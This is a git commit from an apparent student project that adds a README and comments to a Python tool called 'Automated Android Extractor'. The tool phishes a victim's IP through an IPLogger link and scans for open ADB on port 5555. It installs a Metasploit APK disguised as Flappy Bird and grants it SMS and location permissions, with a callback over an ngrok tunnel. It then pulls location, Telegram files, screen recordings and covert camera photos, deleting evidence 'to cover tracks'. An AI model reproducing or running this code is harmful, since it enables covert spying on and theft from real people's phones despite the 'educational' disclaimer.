6f182d07bdd6d330cc55ca78bc17fe8d9beb1796
JoshuaNg1910 <2100929@sit.singaporetech.edu.sg>
2022-11-06 20:52:19 +0800

    Final commit with comments
    Done with the group

---
+++ README.md
@@ -0,0 +1,27 @@
+# Automated Android Extractor
+**`CAUTION: Do not change the directories of this project.`** <br><br>
+
+Automated Android Extractor (AAE) is a program that utilises Msfconsole, Msfvenom, ngrok and Android Debug Bridge to create an all-in-one tool that enables the extraction of data remotely or locally <br> With the data extracted, useful information can be captured and be admissable in court or for any forensic purposes. <br>**`Warning: We are not liable for any malicious activity. Use this for educational purposes only`** <br><br>
+
+## Requirements
+- pip install pystyle
+- pip install pyautogui
+- sudo apt-get install ADB
+- Create ngrok account
+- Download an APK of your choice or you can use the default APK provided
+- Create IPLogger link with a link of your choice and shorten it with short URL shortener
+
+## Steps to run the code
+- Download ZIP from Github [Github](https://github.com/JoshuaNg1910/ICT2202_AAE)
+- Unzip the ZIP file
+- Run python final.py
+
+## Contributors
+**_IceBearWithoutIceSiewDai_** <br>
+Joshua Ng Wei Ming 2100929 <br>
+Sia Yuan Han 2101525 <br>
+Yeo Yi Xuan 2100717 <br>
+Lee Kun Feng 2102972 <br>
+
+## License
+Copyright © 2022. [Singapore Institute of Technology](https://www.singaporetech.edu.sg/)
--- final.py
+++ final.py
@@ -6,11 +6,13 @@ import time
 import threading
 from pystyle import *
 
+#Global variables
 debug = 0
 ip = ""
 rooted = 0
 state = ""
 
+#Function to curl the phishing logger management URL provided by the attacker and save the Public IP address in ip.txt and creates a new directory with Artifact-<public IP address>
 def phish():
     global ip
     url = input("Enter your phishing URL here: ")
@@ -26,6 +28,7 @@ def phish():
     f.write(ip)
     f.close()
 
+#Function to do a nmap scan on the Public IP address port 5555 and saves the port status together with the Public IP address in the ip.txt
 def nmap():
     f = open(f"Artifact-{ip}/ip.txt", "r+")
     ipaddr = f.readline().strip()
@@ -39,6 +42,7 @@ def nmap():
     f.write(" " + state + "\n")
     f.close()
 
+#Function to connect to the target's Android device
 def connectADB():
     global state
     f = open(f"Artifact-{ip}/ip.txt", "r")
@@ -47,6 +51,7 @@ def connectADB():
         os.system("adb connect " + ip)
         print("[+] Connected to " + ip)
 
+#Function to check if ngrok is currently running if not it will spawn another terminal and cd to the directory where ngrok is and run it
 def startNGROK():
     if (subprocess.check_output('ps -aux | grep -o ngrok | grep -v grep | wc -l', shell = True).decode('UTF-8').strip() == "2"):
         output = subprocess.check_output("pwd", shell = True).decode('UTF-8').strip()
@@ -57,6 +62,7 @@ def startNGROK():
         pyautogui.write('./ngrok tcp 2323')
         pyautogui.hotkey('enter')
 
+#Function to create the APK and prompts the attacker to enter the details of the APK
 def createAPK():
     choice = input("Do you want to create and APK [y/n]?")
     if choice[0] == "y":
@@ -69,6 +75,7 @@ def createAPK():
     else:
         pass
 
+#Function to prompt the attacker to enter the APK name just created and send the APK to the target phone and granting the permissions to the APK
 def sendAPK():
     apk = input("Enter your apk name that you just created: ")
     os.system("adb install " + apk)
@@ -77,11 +84,13 @@ def sendAPK():
     os.system("adb shell pm grant bay.flappybird android.permission.READ_SMS")
     os.system("adb shell pm grant bay.flappybird android.permission.ACCESS_FINE_LOCATION")
 
+#Function to grab coordinates from dumpsys.txt file and dump it to location.txt for easier readability
 def dumpLocation():
     os.system("adb shell dumpsys location > Artifact-" + ip + "/dumpsys.txt")
     f = open(f"Artifact-{ip}/dumpsys.txt", "r")
     l = open(f"Artifact-{ip}/location.txt", "w")
     try:
+        #Grep string between fused and hAcc
         location = re.search(r'fused (.*?)hAcc', f.read()).group(1)
         l.write(location)
     except AttributeError:
@@ -89,15 +98,18 @@ def dumpLocation():
     f.close()
     l.close()
 
+#Function to dump all Telegram Audio, Documents, Images and Videos to the Artifact folder
 def teleDump():
     os.system("adb pull /sdcard/Telegram/ Artifact-" + ip)
 
+#Function to start target front camera and take photo. Following which, the photo taken along with other photos will be pulled to the Artifact folder (front camera works only on Nexus 5)
 def imagePull():
     os.system("adb shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1")
     time.sleep(0.5)
     os.system("adb shell input keyevent 27")
     os.system("adb pull /sdcard/DCIM/Camera Artifact-" + ip)
 
+#Function to spawn another terminal to run msfconsole at the Artifact folder using ResourceScript from msfconsole
 def startMSF():
     output = subprocess.check_output("pwd", shell = True).decode('UTF-8').strip()
     pyautogui.hotkey('ctrl', 'shift', 'n')
@@ -107,10 +119,14 @@ def startMSF():
     pyautogui.write('msfconsole -r ../msf.rc')
     pyautogui.hotkey('enter')
 
+#Function to start screen record on target phone and saved to the download folder of the target phone. 
+#The screen record video will then be pulled to the Artifact folder before removing the video from the target folder to cover tracks.
 def screenRecord():
     os.system("adb shell screenrecord /sdcard/download/evidence.mp4")
     os.system("adb pull /sdcard/download/evidence.mp4 Artifact-" + ip + "/")
+    os.system("adb shell rm -f /sdcard/download/evidence.mp4")
 
+#Function to check if device is rooted. If output == "rooted", this means device is rooted
 def checkRoot():
     global rooted
     output = subprocess.check_output("cat Artifact-" + ip + "/msfoutput.txt | grep -Eo 'rooted|not rooted'", shell = True).decode('UTF-8').strip()
@@ -118,6 +134,7 @@ def checkRoot():
         rooted = 1
 
 if __name__ == '__main__':
+  #Banner for the program
     banner = '''
   (c).-.(c)         ****       ****       /**/////   (c).-.(c)
    / ._. \         **//**     **//**     /**          / ._. \ 
@@ -145,22 +162,27 @@ if __name__ == '__main__':
             if state == "open":
                 createAPK()
                 sendAPK()
+                #On location service on the target device
                 os.system("adb shell settings put secure location_mode 3")
                 startMSF()
                 time.sleep(20)
+                #As long as msfconsole is still running, the program will sleep 
                 while (subprocess.check_output('ps -aux | grep -o msfconsole | grep -v grep | wc -l', shell = True).decode('UTF-8').strip()== "3"):
                         time.sleep(1)
                 checkRoot()
                 if rooted == 1:
                     os.system("adb shell 'setprop ro.debuggable 1; setprop service.adb.tcp.port 5555; setprop ro.adb.secure 0;")
+                # creating thread
                 t1 = threading.Thread(target=dumpLocation, args=())
                 t2 = threading.Thread(target=teleDump, args=())
                 t3 = threading.Thread(target=screenRecord, args=())
                 t4 = threading.Thread(target=imagePull, args=())
+                # starting thread
                 t1.start()
                 t2.start()
                 t3.start()
                 t4.start()
+                # wait
                 t1.join()
                 t2.join()
                 t3.join()
@@ -171,19 +193,23 @@ if __name__ == '__main__':
         elif userinput == "Local":
             ip = input("Please enter Artifact name: ")
             os.system("mkdir Artifact-" + ip)
+            # creating thread
             t1 = threading.Thread(target=dumpLocation, args=())
             t2 = threading.Thread(target=teleDump, args=())
             t3 = threading.Thread(target=screenRecord, args=())
             t4 = threading.Thread(target=imagePull, args=())
+            # starting thread
             t1.start()
             t2.start()
             t3.start()
             t4.start()
+            # wait
             t1.join()
             t2.join()
             t3.join()
             t4.join()
         print("\n")
+        #ADB will be disconnected automatically once the Artifacts has been pulled to cover tracks
         os.system("adb disconnect")
         print("\n")
         Write.Print("[+] Stopping AAE", Colors.rainbow, interval=0.04)
